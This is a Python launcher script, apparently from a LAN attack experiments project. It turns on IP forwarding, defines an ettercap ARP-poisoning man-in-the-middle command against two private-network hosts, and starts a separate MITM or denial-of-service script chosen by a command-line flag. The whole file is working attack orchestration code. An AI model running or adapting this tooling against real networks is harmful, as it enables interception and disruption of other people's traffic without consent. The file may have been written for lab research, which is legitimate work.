import subprocess
import shlex
import argparse

class MitmAttack():
    def start_forwarding(self):
        args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
        subprocess.call(args, shell=False)

    def launch_ettercap(self):
        args = shlex.split("ettercap -o -q -T -M arp /192.168.1.10// /192.168.1.20//")
        subprocess.Popen(args)

    def launch_mitm(self):
        mitm = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'mitm_test.py'])
        return mitm

    def main(self):
        args = self.get_arguments()
        self.process_arguments(args)

        if self.attack == "mitm":
            self.start_forwarding()
            mitm = self.launch_mitm()
            mitm.wait()

        if self.attack == "dos":
            mitm = self.launch_mitm()
            mitm.wait()

    def process_arguments(self,arg_parser):
        if arg_parser.attack:
            self.attack = arg_parser.attack
        else:
            self.attack = 'mitm'

    def get_arguments(self):
        parser = argparse.ArgumentParser(description='Master Script that launches LAN communication attacks')
        parser.add_argument("--attack", "-a",help="Attack to be launched, options can be mitm or dos")
        return parser.parse_args()

if __name__ == "__main__":
    mitm = MitmAttack()
    mitm.main()